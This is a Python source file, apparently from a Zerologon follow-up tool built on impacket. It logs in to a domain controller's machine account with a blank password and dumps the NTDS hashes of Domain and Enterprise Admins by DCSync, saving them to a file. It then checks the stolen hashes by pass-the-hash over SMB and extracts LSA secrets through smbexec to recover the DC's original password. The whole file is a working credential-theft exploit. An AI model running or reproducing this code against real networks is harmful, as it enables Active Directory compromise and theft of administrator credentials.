import sys

from io import StringIO

from impacket.ldap import ldap
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes, LSASecrets

class dump():
    def __init__(self, dc_ip, dcName, domain, baseDN, kdcHost, ldaps):
        self.remoteHost = dc_ip
        self.remoteName = dcName # Don't need to remove "$" sign here
        self.dcName = dcName
        self.domain = domain
        self.baseDN = baseDN
        self.kdcHost = kdcHost
        self.ldaps = ldaps

    def NTDSDump_BlankPass(self):
        # Initialize LDAP Connection
        if self.kdcHost is None:
            self.kdcHost = self.remoteHost

        ldapConnection = ldap.LDAPConnection(f'{"ldap" if not self.ldaps else "ldaps"}://{self.domain}', self.baseDN, self.kdcHost)
        ldapConnection.login(self.dcName, "", self.domain, "", "")
        searchFilter = f"(&(|(memberof=CN=Domain Admins,CN=Users,{self.baseDN})(memberof=CN=Enterprise Admins,CN=Users,{self.baseDN}))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

        # Initialize smb connection for get into DRSUAPI method
        smbConnection = SMBConnection(self.remoteName, self.remoteHost)
        # Blank password, lm & nt hashes
        smbConnection.login(self.dcName, "", self.domain, "", "")

        # Initialize remoteoperations
        outputFileName = "{}_{}_domain_admins".format(self.dcName, self.remoteHost)
        remoteOps  = RemoteOperations(smbConnection=smbConnection, doKerberos=False, kdcHost=self.kdcHost, ldapConnection=ldapConnection)
        nh = NTDSHashes(None, None, isRemote=True, history=False,
                                        noLMHash=False, remoteOps=remoteOps,
                                        useVSSMethod=False, justNTLM=True,
                                        pwdLastSet=False, resumeSession=None,
                                        outputFileName=outputFileName, justUser=None,
                                        ldapFilter=searchFilter, printUserStatus=False)
        
        print(f'[+] Retrieved all domain admin cred. (save creds to file "{outputFileName}.ntds")')
        nh.dump()

        with open (f"{outputFileName}.ntds") as f:
            creds = f.readlines()

        # Domain admin to extra lsa secret to get DC history password (plain_password_hex)
        # Return all domain admins cred, for some reason, maybe some user creds are unavailable like PASSWORD_EXPIRED.
        nh.finish()
        return self.verifyCred(creds)
    
    def verifyCred(self, creds):
        for i in creds:
            username = i.split(":")[0]
            if "\\" in username:
                username = username.split("\\")[1]

            nthash = i.split(":")[3]
            try:
                smbConnection = SMBConnection(self.remoteName, self.remoteHost)
                smbConnection.login(username, "", self.domain, "", nthash)
            except Exception as e:
                print("[-] Domain admin: {} unavailable, reason: {}".format(username, str(e)))
            else:
                print("[+] Use domain admin: {} to restore DC password".format(username))
                return username, nthash

    def LSADump(self, username, nthash):
        outputFileName = f"{self.dcName}_{self.remoteHost}_lsa"
        smbConnection = SMBConnection(self.remoteName, self.remoteHost)
        smbConnection.login(username, "", self.domain, "", nthash)
        remoteOps  = RemoteOperations(smbConnection, False)
        remoteOps.setExecMethod("smbexec")
        remoteOps.enableRegistry()
        bootKey = remoteOps.getBootKey()
        SECURITYFileName = remoteOps.saveSECURITY()
        LSASecret = LSASecrets(SECURITYFileName, bootKey, remoteOps, True, False)
        current=sys.stdout
        sys.stdout = StringIO()
        LSASecret.dumpSecrets()
        LSASecret.exportSecrets(outputFileName)
        sys.stdout = current

        with open(f"{outputFileName}.secrets") as f:
            content = f.readlines()
        
        hexpass = ""
        for i in content:
            if "plain_password_hex" in i:
                hexpass = i.split(":")[2]

        LSASecret.finish()

        print("[+] Get DC origin password: \r\n{}".format(hexpass))
        return hexpass